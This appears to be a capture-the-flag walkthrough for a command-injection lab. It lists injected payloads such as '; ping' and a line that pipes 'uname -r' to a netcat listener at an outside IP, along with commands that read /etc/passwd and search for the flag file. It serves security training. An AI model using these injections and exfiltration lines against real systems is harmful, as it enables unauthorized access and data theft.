---
description: Walkthrough of OS Command Injection
---

# Injection

## :syringe: Blind Command Injection

### #1 Ping the box with 10 packets.

```bash
; ping -c 10 10.9.101.193
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 21-01-05.png>)

### #2 Redirect the box's Linux Kernel Version to a file on the web server.

```bash
nc -nvlp 4444
; uname -r | nc -nv 10.9.101.193 4444
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 21-05-45.png>)

### #3 Enter "root" into the input and review the alert.

![](<../../.gitbook/assets/Screenshot from 2020-08-25 21-13-49.png>)

### #4 Enter "www-data" into the input and review the alert.

![](<../../.gitbook/assets/Screenshot from 2020-08-25 21-13-59.png>)

### #5 **Enter your name into the input and review the alert.**

![](<../../.gitbook/assets/Screenshot from 2020-08-25 21-14-09.png>)

## :syringe: Active Command Injection

### #1 **What strange text file is in the website root directory?**

```
ls
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 21-33-36.png>)

### #2 **How many non-root/non-service/non-daemon users are there?**

```
cat /etc/passwd | egrep '/bin/bash|/bin/sh' 
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 21-49-06.png>)

### #3 **What user is this app running as?**

```
id
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 21-32-55.png>)

### #4 **What is the user's shell set as?**

```
cat /etc/passwd | grep www-data
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 21-34-17.png>)

### #5 **What version of Ubuntu is running?**

```
cat /etc/issue
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 21-39-03.png>)

### #6 **Print out the MOTD.  What favorite beverage is shown?**

```
find /etc -type f -name 00-header -exec cat {} \;
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 22-04-51.png>)

## :pirate\_flag: Get The Flag!

### #1 **Get the flag!**

```
find / -type f -iname *flag* 2>/dev/null
cat /etc/flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 21-51-50.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-25 21-52-00.png>)

## Support Material

{% embed url="https://linuxize.com/post/how-to-check-your-ubuntu-version/" %}

{% embed url="https://linuxconfig.org/how-to-change-welcome-message-motd-on-ubuntu-18-04-server" %}

